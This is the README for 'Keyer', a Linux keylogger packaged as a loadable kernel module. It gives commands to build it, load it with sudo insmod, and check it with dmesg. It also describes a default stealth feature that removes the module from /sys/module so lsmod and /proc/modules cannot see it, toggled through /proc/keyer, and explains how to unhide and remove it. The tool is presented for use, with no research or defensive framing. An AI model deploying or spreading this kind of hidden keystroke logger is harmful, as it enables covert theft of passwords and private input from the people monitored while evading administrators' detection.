# Keyer
A simple linux keylogger using a loadable kernel module.
### Installation
You need to install the linux kernel headers for your kernel before you begin.
```sh
$ make
$ sudo insmod keyer.ko
```
Check if module is running:
```sh
$ dmesg | tail 
```
### Functions
By default it module entry is removed from /sys/module so it cannot be detected by lsmod and /proc/modules.
To toggle hidden status:
```sh
$ cat /proc/keyer
```

### Removal
Make sure it is not hidden:
```sh
$ lsmod | grep keyer
```
If above command returns nothing, toggle hidden status.
```sh
$ cat /proc/keyer
```
And then remove:
```sh
$ sudo rmmod keyer.ko
```
